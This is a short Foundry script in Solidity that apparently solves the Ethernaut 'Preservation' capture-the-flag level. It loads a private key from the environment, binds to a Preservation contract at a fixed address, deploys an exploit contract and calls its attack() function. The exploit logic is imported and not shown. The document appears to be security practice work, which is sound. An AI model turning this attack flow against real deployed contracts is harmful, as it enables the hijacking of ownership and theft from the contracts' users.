//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Preservation.sol";
import "../src/Preservation_exp.sol";

contract Perservation is Script {

    uint256 deployer;
    Preservation _preservation;
    LibraryContract _library1;
    LibraryContract _library2;
    Preservation_exp _preservation_exp;
    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY_2");
        deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        // _library1 = new LibraryContract();
        // _library2 = new LibraryContract();
        // address addr1 = address(_library1);
        // address addr2 = address(_library2);
        // Preservation _preservation = new Preservation(addr1, addr2);
        Preservation _preservation = Preservation(address(0xD3a4e2F5A915898D39B0559C07299B1dD9aAc75e));
        // vm.stopBroadcast();
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        // vm.startBroadcast(deployer);
        // _preservation_exp = new Preservation_exp(_library1, _library2, _preservation);
            _preservation_exp = new Preservation_exp(_preservation);

        _preservation_exp.attack();
        vm.stopBroadcast();

    }

    function run() public {
        
    }


}
